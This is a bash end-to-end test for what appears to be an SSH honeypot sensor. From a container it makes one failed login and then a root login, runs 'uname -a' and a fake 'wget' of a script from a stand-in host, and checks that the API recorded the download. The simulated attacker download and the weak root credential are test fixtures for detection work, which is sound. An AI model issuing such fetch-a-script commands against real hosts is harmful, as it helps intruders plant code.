#!/usr/bin/env bash
# End-to-end check of the SSH sensor: log in for real from a throwaway container,
# run two commands (one is a fake download), then wait until the events are
# visible through the API. Used by `just ssh-test` and by CI.
set -euo pipefail

# shellcheck source=scripts/lib/engine.sh
. "$(dirname "$0")/lib/engine.sh"

SSH_PORT=${SSH_HOST_PORT:-22}
API_URL=${API_URL:-http://127.0.0.1:${DASHBOARD_PORT:-8443}}
# The marker makes this run's events easy to find: it is the user name of a failed login.
MARK="e2e$(date +%s)"

echo "== real SSH login against 127.0.0.1:${SSH_PORT}"
# Host networking: the container reaches the published port like any local client.
ctr run --rm --network host docker.io/library/alpine:3.24 sh -c "
  apk add -q --no-cache openssh-client sshpass >/dev/null
  opts='-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -p ${SSH_PORT}'
  # one failed login with a recognisable user name, then a successful one
  sshpass -p wrong ssh \$opts -o NumberOfPasswordPrompts=1 ${MARK}@127.0.0.1 true || true
  sshpass -p root ssh \$opts root@127.0.0.1 'uname -a; wget http://198.51.100.7/x.sh'
"

echo "== waiting for the events to reach the API (max 60 s)"
for _ in $(seq 1 30); do
  if curl -fsS "${API_URL}/api/v1/sessions?sensor=ssh&limit=20" 2>/dev/null | grep -q '"downloads":[1-9]'; then
    echo "OK: an SSH session with a recorded download is visible through the API."
    exit 0
  fi
  sleep 2
done
echo "FAIL: no SSH session with a download appeared in the API within 60 s." >&2
exit 1
